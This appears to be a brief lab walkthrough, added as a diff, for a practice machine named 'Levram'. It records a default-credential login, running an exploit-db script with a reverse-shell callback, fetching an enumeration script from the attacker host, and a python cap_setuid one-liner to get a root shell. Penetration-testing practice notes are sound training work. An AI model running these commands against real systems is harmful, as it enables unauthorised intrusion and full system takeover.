@@ -1,0 +1,41 @@
+192.168.159.24 Levram
+
+
+http://192.168.159.24:8000
+login default username and password admin:admin
+got access enumerate version and search on google for avialable exploits 
+
+https://www.exploit-db.com/exploits/50640
+
+python3 50640.py -t 192.168.159.24 -p 8000 -L 192.168.45.173 -P 8000
+got error 
+analyze script and found I will have to create project
+I created project name test
+
+python3 50640.py -t 192.168.159.24 -p 8000 -L 192.168.45.173 -P 8000
+I got shell easily
+but as a app
+use find / -perm -u=s 2>/dev/null (no luck)
+
+
+wget http://192.168.45.173:440/lse.sh
+Found 
+[+] Files with POSIX capabilities set:
+/snap/core20/1518/usr/bin/ping cap_net_raw=ep
+/snap/core20/1891/usr/bin/ping cap_net_raw=ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+/usr/bin/python3.10 cap_setuid=ep
+/usr/bin/ping cap_net_raw=ep
+
+https://gtfobins.github.io/gtfobins/python/
+/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+cd /root
+cat proof.txt
+
+
+OTR
+https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
+
+
